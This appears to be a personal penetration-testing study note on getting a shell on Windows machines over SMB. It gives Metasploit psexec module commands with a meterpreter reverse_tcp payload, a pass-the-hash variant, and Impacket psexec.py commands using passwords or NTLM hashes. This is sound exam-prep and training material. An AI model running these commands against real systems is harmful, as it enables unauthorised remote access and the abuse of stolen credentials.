We can gain shell access through different ways.

1) Using metasploit:

```
msfconsole
```

```
search psexec
```

search for exploit/windows/smb/psexec

```
use <number_at_which_thing_at>
```

go to options and set payload to 

```
set payload windows/x64/meterpreter/reverse_tcp
```

Then set your RHOSTS.

```
set rhosts <ip_of_rhost>
```

```
set smbdomain <name_of_domain>
```

```
set smbuser <name_of_user>
```

```
set smbpass <password>
```

Go to show targets and see which target you should exploit. It should work with automatic but if not, native upload and powershell might just work.

```
run
```

Then you should get a shell

![[Pasted image 20240828111618.png]]

You can also run other things while this shell is running by using:

```
background
```

And then you can get back to it by

```
sessions 1
```

You can also use metaploit to do an NTLM attack here. Which is basically a hash attack.

So you first need to set smbuser

```
set smbuser administrator
```

You dont need an smbdomain so you can unset that.

Then you need to copy the entire hash which is the LM and the NT part including the colon and run this

```
set smbpass <paste>
```

Then run

```
run
```

2) Manually without metasploit(for exams like OSCP)

Run the following command:

```
psexec.py <DC>/<name_of_user>:<password>@<ip_address>
```

And then you should get a shell

![[Pasted image 20240828112248.png]]

You can also login through a hash as well.

```
psexec.py administrator@<ip_address> -hashes <paste_the_hash>
```

![[Pasted image 20240828112427.png]]

